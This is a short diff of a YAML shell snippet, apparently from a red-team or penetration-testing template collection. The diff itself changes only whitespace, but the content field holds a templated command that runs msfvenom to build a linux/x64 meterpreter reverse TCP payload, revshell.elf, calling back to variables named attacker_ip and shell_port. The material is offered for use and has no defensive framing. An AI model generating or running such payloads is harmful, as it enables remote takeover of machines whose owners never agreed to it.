@@ -4,7 +4,7 @@ metadata:
   tags: ["shell", "linux"]
   created: "2025-03-29"
   author: "Unknown"
-  
+
 content: |
   mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
   msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<%=$(esh variables/attacker_ip)%> LPORT=<%=$(esh variables/shell_port)%> -f elf > packstation/outbound/revshell.elf ; \
